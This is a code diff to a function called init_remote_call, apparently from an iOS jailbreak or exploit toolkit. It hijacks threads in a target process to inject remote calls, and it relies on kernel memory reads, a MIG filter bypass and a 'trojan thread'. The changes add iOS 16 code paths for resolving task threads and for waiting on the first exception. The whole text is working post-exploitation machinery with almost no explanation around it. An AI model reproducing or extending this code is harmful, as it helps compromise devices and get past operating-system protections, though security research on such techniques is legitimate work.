@@ -1253,16 +1861,20 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         } else if (task && !validThreadCount) {
             printf("[%s:%d] Got weird tro on first thread, resetting\n", __FUNCTION__, __LINE__);
             firstThread = retry_first_thread(useMigFilterBypass);
+            if (useIOS16RemoteCall)
+                firstThread = rc_resolve_task_thread_entry(firstThread, g_RC_taskAddr);
             currThread = firstThread;
             retryCount++;
             continue;
         }
         
-        uint64_t next = kread64(currThread + off_thread_task_threads_next);
+        uint64_t next = rc_next_task_thread(currThread, g_RC_taskAddr);
         if (!next) {
             if (!validThreadCount) {
                 printf("[%s:%d] Got empty next thread. Retry\n", __FUNCTION__, __LINE__);
                 firstThread = retry_first_thread(useMigFilterBypass);
+                if (useIOS16RemoteCall)
+                    firstThread = rc_resolve_task_thread_entry(firstThread, g_RC_taskAddr);
                 currThread = firstThread;
                 retryCount++;
                 continue;
@@ -1293,7 +1905,10 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         printf("[%s:%d] First exception wait timeout=%dms\n",
                __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
     }
-    if(!wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false)) {
+    bool gotFirstException = useIOS16RemoteCall
+        ? rc_ios16_wait_first_exception(firstExceptionPort, &exc, process)
+        : wait_exception(firstExceptionPort, &exc, firstExceptionTimeoutMS, false);
+    if(!gotFirstException) {
         printf("[%s:%d] Failed to receive first exception within %dms\n",
                __FUNCTION__, __LINE__, firstExceptionTimeoutMS);
         for (NSNumber *thread in g_RC_threadList) {
@@ -1377,6 +1992,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         abandon_remote_call();
         return -1;
     }
+    g_RC_callThreadPort = (mach_port_t)callThreadPort;
     g_RC_callThreadAddr = task_get_ipc_port_kobject(g_RC_taskAddr, (mach_port_t)callThreadPort);
     if (!is_kaddr_valid(g_RC_callThreadAddr)) {
         printf("[%s:%d] failed to resolve synthetic thread kobject port=0x%llx addr=%#llx\n",
@@ -1418,6 +2034,9 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if (g_RC_creatingExtraThread) {
         printf("[%s:%d] New thread created, resuming original\n", __FUNCTION__, __LINE__);
         restore_trojan_thread(&g_RC_originalState);
+        g_RC_trojanThreadAddr = g_RC_callThreadAddr;
+        printf("[%s:%d] Stable RemoteCall thread=0x%llx\n",
+               __FUNCTION__, __LINE__, g_RC_trojanThreadAddr);
     }
     printf("[%s:%d] Original thread restored\n", __FUNCTION__, __LINE__);
     
